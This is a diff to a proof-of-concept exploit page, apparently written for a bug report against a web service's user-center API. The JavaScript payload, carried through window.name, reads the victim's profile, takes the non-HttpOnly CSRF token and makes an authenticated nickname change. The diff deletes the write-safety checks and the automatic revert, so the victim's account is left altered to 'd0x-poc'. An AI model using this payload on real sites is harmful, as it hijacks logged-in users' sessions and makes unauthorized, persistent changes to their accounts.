@@ -25,7 +25,7 @@
 
   <button class="cta" id="go">Review agreement</button>
   <button class="cta alt" id="goTab">Review agreement (open in a new tab)</button>
-  <button class="cta alt" id="goWrite">Review agreement (read + authenticated write + revert)</button>
+  <button class="cta alt" id="goWrite">Review agreement (read + authenticated write, change left in place)</button>
 
   <ol>
     <li>Click a button above. This page stores the payload in <code>window.name</code> and
@@ -169,14 +169,19 @@ function payload(OOB, DOWRITE) {
       // Authenticated state change, using only what this origin handed us.
       // The write requires the CSRF token twice: as the `c` query parameter
       // and as the X-CSRF-TOKEN cookie. From inside the origin the cookie is
-      // sent automatically and the parameter came out of the read above, so
-      // the double-submit pair is complete.
+      // sent automatically - it is not HttpOnly, so script reads it directly -
+      // and the parameter came out of the read above. Both halves of the
+      // double-submit pair are therefore available to the payload.
       //
-      // Two safety rules, both enforced here, not by convention:
-      //  1. It never writes unless the ORIGINAL value was recovered first, so
-      //     the revert is always possible. No original -> no write.
-      //  2. It writes a suffixed variant of the current value and puts the
-      //     original back immediately, then re-reads to confirm the restore.
+      // The change is left in place on purpose: d0x wants the profile to show
+      // it as visible evidence. The previous value is captured and printed so
+      // it can be restored by hand from the profile UI afterwards.
+      //
+      // Note what the actual proof is. It is NOT that the field looks
+      // different in the UI, and it is NOT the write's own 200 - the endpoint
+      // is named commit-AUDIT and may queue for review. The proof is the
+      // re-read below, which compares the value the SERVER now stores against
+      // what was written.
       // ---------------------------------------------------------------------
       var origNick = (t.match(/"nickName"\s*:\s*"([^"]*)"/) || [])[1];
       summary.write = { attempted: false };
@@ -190,55 +195,37 @@ function payload(OOB, DOWRITE) {
         add('write', 'SKIPPED - no csrf token recovered');
         return finish();
       }
-      if (typeof origNick !== 'string' || !origNick) {
-        summary.write.skipped = 'original nickName not found in user-info; refusing to write without a revert value';
-        add('write', 'SKIPPED - original nickName not in user-info, refusing to write without a revert value');
-        return finish();
-      }
 
       var W = '/_api/ucenter/user/profile/commit-audit?lang=en_US&c=' + encodeURIComponent(csrf);
       var H = { 'content-type': 'application/json', 'x-site': 'global' };
-      var SENTINEL = (origNick + '-m125').slice(0, 24);
+      var NEWNICK = 'd0x-poc';
 
-      summary.write = { attempted: true, endpoint: W.split('?')[0], original: origNick, sentinel: SENTINEL };
-      add('original nickName', origNick);
+      summary.write = {
+        attempted: true,
+        endpoint: W.split('?')[0],
+        previous: origNick || null,
+        newValue: NEWNICK,
+        reverted: false
+      };
+      add('nickName before write', origNick || '(not found in user-info - restore value unknown)');
 
-      fetch(W, { method: 'POST', credentials: 'include', headers: H, body: JSON.stringify({ nickName: SENTINEL }) })
+      fetch(W, { method: 'POST', credentials: 'include', headers: H, body: JSON.stringify({ nickName: NEWNICK }) })
         .then(function (r) {
           return r.text().then(function (b) {
             summary.write.status = r.status;
             summary.write.body = b.slice(0, 300);
-            add('POST commit-audit (nickName -> ' + SENTINEL + ')', 'HTTP ' + r.status + '  ' + b.slice(0, 160));
-            // A 200 is not a state change. The endpoint is named commit-AUDIT,
-            // so it may queue for review instead of applying. Re-read and show
-            // the stored value actually moved, otherwise this proves nothing.
-            return fetch('/_api/ucenter/user-info', { credentials: 'include' })
-              .then(function (rc) { return rc.text(); })
-              .then(function (tc) {
-                var mid = (tc.match(/"nickName"\s*:\s*"([^"]*)"/) || [])[1];
-                summary.write.nickNameAfterWrite = mid;
-                summary.write.applied = mid === SENTINEL;
-                add('nickName after write', mid + (mid === SENTINEL
-                  ? '  (APPLIED - state changed)'
-                  : '  (unchanged - endpoint returned ' + r.status + ' but did not apply; likely queued for audit)'));
-                // revert, unconditionally, whatever the write returned
-                return fetch(W, { method: 'POST', credentials: 'include', headers: H, body: JSON.stringify({ nickName: origNick }) });
-              });
+            add('POST commit-audit (nickName -> ' + NEWNICK + ')', 'HTTP ' + r.status + '  ' + b.slice(0, 160));
+            return fetch('/_api/ucenter/user-info', { credentials: 'include' });
           });
         })
-        .then(function (r2) {
-          return r2.text().then(function (b2) {
-            summary.write.revertStatus = r2.status;
-            summary.write.revertBody = b2.slice(0, 300);
-            add('REVERT (nickName -> ' + origNick + ')', 'HTTP ' + r2.status + '  ' + b2.slice(0, 160));
-            return fetch('/_api/ucenter/user-info', { credentials: 'include' }).then(function (r3) { return r3.text(); });
-          });
-        })
-        .then(function (t3) {
-          var now = (t3.match(/"nickName"\s*:\s*"([^"]*)"/) || [])[1];
-          summary.write.nickNameAfterRevert = now;
-          summary.write.restored = now === origNick;
-          add('nickName after revert', now + (now === origNick ? '  (restored)' : '  (NOT RESTORED - set it back by hand)'));
+        .then(function (rc) { return rc.text(); })
+        .then(function (tc) {
+          var now = (tc.match(/"nickName"\s*:\s*"([^"]*)"/) || [])[1];
+          summary.write.nickNameAfterWrite = now;
+          summary.write.applied = now === NEWNICK;
+          add('nickName after write', now + (now === NEWNICK
+            ? '  (APPLIED - the server now stores this; left in place)'
+            : '  (unchanged - endpoint returned ' + summary.write.status + ' but did not apply; likely queued for audit)'));
           finish();
         })
         .catch(function (e) {
@@ -298,7 +285,7 @@ function sameTab(doWrite) {   // no popup involved, so no popup blocker
 document.getElementById('go').addEventListener('click', function () { sameTab(false); });
 document.getElementById('goTab').addEventListener('click', function () { window.open(SINK, buildName(false)); });
 document.getElementById('goWrite').addEventListener('click', function () {
-  if (confirm('This performs an authenticated write (nickName) on the account that is logged in, then reverts it. Continue?')) sameTab(true);
+  if (confirm('This sets the nickName of the logged-in account to "d0x-poc" and LEAVES IT CHANGED. The previous value is shown on the result page so you can restore it by hand. Continue?')) sameTab(true);
 });
 </script>
 </body>
